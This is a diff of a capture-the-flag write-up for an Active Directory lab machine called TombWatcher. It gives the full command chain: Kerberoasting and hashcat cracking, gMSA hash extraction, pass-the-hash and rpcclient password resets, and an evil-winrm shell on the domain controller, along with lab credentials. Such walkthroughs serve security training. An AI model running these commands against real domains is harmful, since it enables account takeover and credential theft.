@@ -66,7 +66,9 @@ bloodhound-python -c all -ns 10.10.11.72 -dc tombwatcher.htb -d tombwatcher.htb 
 
 
 
-## Kerberost attack to user Alfred
+## Privilege Escalation to DC user
+
+### Kerberost attack to user Alfred
 
 As we can see bellow, there is a kerberoastable user.&#x20;
 
@@ -96,7 +98,7 @@ hashcat -m 13100 -o creds.txt -a 0 kerb.txt /usr/share/wordlists/rockyou.txt
 
 We've cracked it. The password for the user `Alfred` is `basketball` .
 
-## AddSelf privilege on user Alfred
+### AddSelf privilege on user Alfred
 
 From bloodhound we can see which the user Alfred has privilege to add itself to INFRASTRUCTURE AD group.
 
@@ -110,9 +112,11 @@ bloodyAD --host '10.10.11.72' -d 'TOMBWATCHER.HTB' -u 'Alfred' -p 'basketball' a
 
 
 
-## ReadGMSAPassword rights&#x20;
+### ReadGMSAPassword rights&#x20;
 
-Always from bloodhound we notice that the group INFRASTRUCTURE has ReadGMSAPassword rights.
+Always from bloodhound we notice that the group `INFRASTRUCTURE` has `ReadGMSAPassword` rights to `ASNIBLE_DEV$` service user.
+
+<figure><img src="../../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 netexec ldap 10.10.11.72 -u Alfred -p 'basketball' --gmsa
@@ -120,3 +124,65 @@ netexec ldap 10.10.11.72 -u Alfred -p 'basketball' --gmsa
 Account: ansible_dev$         NTLM: 1c37d00093dc2a5f25176bf2d474afdc
 ```
 
+
+
+### ForceChangePassword of SAM user
+
+<figure><img src="../../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>
+
+This service account has the privilege to force change password to `SAM` user.
+
+{% code title="" overflow="wrap" %}
+```bash
+pth-net rpc password "SAM" 'Password123!' -U "TOMBWATCHER.HTB"/"ANSIBLE_DEV$"%"ffffffffffffffffffffffffffffffff":"1c37d00093dc2a5f25176bf2d474afdc" -S "DC01.tombwatcher.htb" 
+```
+{% endcode %}
+
+
+
+### WriteOwner rights to John user
+
+<figure><img src="../../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>
+
+The SAM user has `WriteOwner` rights to John, and John has the rights to connect to the Domain Controller.
+
+With WriteOwner rights we can force John's password like that.
+
+```bash
+rpcclient -U TOMBWATCHER.HTB/SAM 10.10.11.72
+
+
+setuserinfo2 john 23 'Password123!'
+```
+
+Now we can connect to the Domain Controller with `Evil-winrm` tool.
+
+```bash
+evil-winrm -i 10.10.11.72 -u 'john' -p 'Password123!'
+```
+
+
+
+### User.flag
+
+Connecting to the DC we will able to get the user flag.
+
+```powershell
+more C:\Users\john\Desktop\user.txt
+```
+
+
+
+## Privilege Escalation to Root
+
+
+
+### winPEAS
+
+```
+C:\Windows\Panther\Unattend.xml 
+```
+
+
+
+Try to check AD directory Recycle Bin.
